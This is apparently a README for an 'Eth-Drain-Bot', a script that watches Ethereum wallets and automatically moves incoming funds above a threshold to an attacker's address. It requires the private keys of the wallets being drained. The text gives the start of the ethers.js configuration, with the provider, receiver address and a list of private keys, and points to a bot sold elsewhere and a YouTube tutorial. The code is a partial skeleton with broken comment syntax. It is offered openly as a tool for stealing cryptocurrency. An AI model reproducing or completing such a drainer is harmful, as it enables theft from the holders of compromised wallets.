# Eth-Drain-Bot
This is a bot that will listen for transactions over a set amount and auto transfer them to set wallet address. 

This is the same bot that is being sold by @dummydu and on youtube @techaddict https://www.youtube.com/watch?v=5AkLogdCNMQ

You MUST know the privatekey of the wallet you want to drain. 

You also must set up your own rpc-node with infura. 


const { ethers } = require('ethers')

const provider = new ethers.providers.JsonRpcProvider("https://mainnet.infura.io/v3/APIKEY") / #set up infura account and replace API with key for eth MAINNET. 

const addressReceiver = 'Wallet Address To Transfer To' / # "0x8727309457340958734058734095' put wallet address that eth will be sent to in between ''

#put list of private keys below. 

const privateKeys = [
  "PrivateKey01",
  "PrivateKey02",
  "PrivateKey03",
  "PrivateKey04",
  "PrivateKey05"
]

const gasPrice = 70

you can watch this video for help. 

https://www.youtube.com/watch?v=5AkLogdCNMQ


